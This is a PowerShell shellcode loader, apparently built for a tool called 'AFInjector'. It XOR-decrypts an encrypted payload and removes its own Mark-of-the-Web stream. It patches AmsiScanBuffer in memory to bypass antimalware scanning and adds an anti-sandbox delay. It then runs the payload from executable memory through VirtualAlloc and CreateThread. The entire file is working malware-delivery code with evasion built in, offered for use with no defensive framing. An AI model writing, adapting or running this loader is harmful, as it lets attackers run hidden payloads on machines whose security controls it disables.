# AFInjector PowerShell Launcher - Correct for BIN Format
# This script replicates the EXACT decryption used in AFInjector BIN format
# BIN format uses ONLY XOR decryption, NOT AES-CBC

param(
    [Parameter(Mandatory=$true)]
    [string]$PayloadPath,
    
    [Parameter(Mandatory=$true)]
    [string]$MetadataPath
)

$ErrorActionPreference = 'Stop'

Write-Host "[+] AFInjector PowerShell Launcher (BIN Format)" -ForegroundColor Green

try {
    # 1. Read metadata file
    Write-Host "[+] Reading encryption metadata..." -ForegroundColor Cyan
    $metadata = Get-Content $MetadataPath | ConvertFrom-StringData
    
    $aesKey = $metadata.AES_KEY
    $aesIV = $metadata.AES_IV
    $scrambleByte = $metadata.SCRAMBLE_BYTE
    $payloadType = $metadata.PAYLOAD_TYPE
    
    Write-Host "    AES Key: $aesKey" -ForegroundColor Gray
    Write-Host "    AES IV: $aesIV" -ForegroundColor Gray
    Write-Host "    Scramble Byte: 0x$scrambleByte" -ForegroundColor Gray
    Write-Host "    Payload Type: $payloadType" -ForegroundColor Gray

    # 2. Read encrypted payload
    Write-Host "[+] Reading encrypted payload..." -ForegroundColor Cyan
    $encPayload = [System.IO.File]::ReadAllBytes($PayloadPath)
    Write-Host "    Payload size: $($encPayload.Length) bytes" -ForegroundColor Gray

    # 3. EXTRACT XOR KEY (CRITICAL STEP)
    # For BIN format, AFInjector uses ONLY the first byte of the AES key as XOR key
    # The scramble byte in metadata IS the XOR key for BIN format
    $xorKey = [System.Convert]::ToByte($scrambleByte, 16)
    Write-Host "[+] Using XOR key: 0x$xorKey ($xorKey decimal)" -ForegroundColor Yellow

    # 4. DECRYPTION - XOR ONLY (No AES for BIN format!)
    Write-Host "[+] Decrypting with XOR (BIN format)..." -ForegroundColor Red
    $decryptedBytes = [byte[]]::new($encPayload.Length)
    
    for ($i = 0; $i -lt $encPayload.Length; $i++) {
        $decryptedBytes[$i] = $encPayload[$i] -bxor $xorKey
    }
    
    Write-Host "    Decrypted size: $($decryptedBytes.Length) bytes" -ForegroundColor Gray

    # 5. Verify payload type
    if ($payloadType -eq "pe_file" -and $decryptedBytes.Length -ge 2) {
        if ($decryptedBytes[0] -eq 0x4D -and $decryptedBytes[1] -eq 0x5A) {
            Write-Host "[+] PE file signature verified (MZ)" -ForegroundColor Green
        } else {
            Write-Host "[!] Warning: Expected PE file but signature not found" -ForegroundColor Yellow
        }
    } elseif ($payloadType -eq "raw_shellcode") {
        Write-Host "[+] Raw shellcode detected" -ForegroundColor Green
    }

    # 6. Anti-sandbox/evasion techniques
    Write-Host "[+] Applying evasion techniques..." -ForegroundColor Cyan
    
    # MOTW removal
    $me = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
    if ($me) {
        Unblock-File -Path $me -EA SilentlyContinue
        Remove-Item -Path $me -Stream Zone.Identifier -EA SilentlyContinue
    }
    
    # AMSI bypass (simplified)
    try {
        $amsiCode = @"
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lpFileName);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        if (lib == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        if (addr == IntPtr.Zero) return;
        uint old = 0;
        VirtualProtect(addr, (UIntPtr)6, 0x40, ref old);
        Marshal.Copy(new byte[]{0x31, 0xC0, 0xC3}, 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)6, old, ref old);
    }
}
"@
        Add-Type -TypeDefinition $amsiCode -Language CSharp
        [Amsi]::Patch()
        Write-Host "    AMSI bypass applied" -ForegroundColor Gray
    } catch {
        Write-Host "    AMSI bypass failed: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # 7. Anti-sandbox delay (matching AFInjector timing)
    Write-Host "[+] Anti-sandbox delay: 2 seconds (matching AFInjector)..." -ForegroundColor Cyan
    Start-Sleep -Seconds 2

    # 8. Execute shellcode
    Write-Host "[+] Executing payload..." -ForegroundColor Red
    
    $runnerCode = @"
using System;
using System.Runtime.InteropServices;
public class Runner {
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr hObject);

    public static void ExecuteAndWait(byte[] sc, uint timeoutMs) {
        IntPtr region = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, region, sc.Length);
        uint tid;
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, region, IntPtr.Zero, 0, out tid);
        if (hThread != IntPtr.Zero) {
            WaitForSingleObject(hThread, timeoutMs);
            CloseHandle(hThread);
        }
    }
}
"@
    Add-Type -TypeDefinition $runnerCode -Language CSharp
    
    Write-Host "[+] Handing control to payload (waiting 60s)..." -ForegroundColor Magenta
    [Runner]::ExecuteAndWait($decryptedBytes, 60000)
    
    Write-Host "[+] Payload execution completed" -ForegroundColor Green

} catch {
    Write-Host "[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "[!] Stack trace: $($_.ScriptStackTrace)" -ForegroundColor Red
}

Write-Host "[+] Launcher exiting" -ForegroundColor Green
